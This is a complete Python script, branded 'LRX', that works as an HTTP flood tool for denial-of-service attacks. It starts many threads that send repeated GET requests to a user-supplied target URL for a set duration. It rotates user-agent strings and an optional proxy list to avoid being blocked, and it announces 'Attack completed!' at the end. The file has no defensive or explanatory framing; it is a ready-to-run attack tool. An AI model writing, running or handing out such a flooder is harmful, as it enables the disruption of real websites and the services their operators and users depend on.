import argparse
import threading
import requests
import random
import time

# Glowing Green Hacking Text
GLOW_GREEN = '\033[92m'
RESET_COLOR = '\033[0m'

BANNER = f"""
{GLOW_GREEN}=======================================================

██╗     ██████╗ ██╗  ██╗
██║     ██╔══██╗╚██╗██╔╝
██║     ██████╔╝ ╚███╔╝ 
██║     ██╔══██╗ ██╔██╗ 
███████╗██║  ██║██╔╝ ██╗
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
                        

     Licensed and Branded to LRX Users Only
=======================================================
"""


print(BANNER)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
]

proxies = []

parser = argparse.ArgumentParser(description="Brutal LRX HTTP Flooder")
parser.add_argument("--target", required=True, help="Target URL")
parser.add_argument("--duration", required=True, type=int, help="Attack duration in seconds")
parser.add_argument("--threads", required=True, type=int, help="Number of threads")
parser.add_argument("--proxy", help="Proxy file (optional)")
args = parser.parse_args()

if args.proxy:
    with open(args.proxy, "r") as file:
        proxies = [line.strip() for line in file if line.strip()]

end_time = time.time() + args.duration


def send_request():
    global end_time
    while time.time() < end_time:
        try:
            headers = {"User-Agent": random.choice(user_agents), "Connection": "keep-alive"}
            proxy = None
            if proxies:
                proxy = {"http": random.choice(proxies), "https": random.choice(proxies)}
            response = requests.get(args.target, headers=headers, proxies=proxy, timeout=5)
            print(f"LRX>>>> Sent HTTP request - Status: {response.status_code}")
        except Exception as e:
            print(f"[ERROR] {e}")


threads = []
for _ in range(args.threads):
    t = threading.Thread(target=send_request)
    t.daemon = True
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("[+]LRX>>>>> Attack completed!")
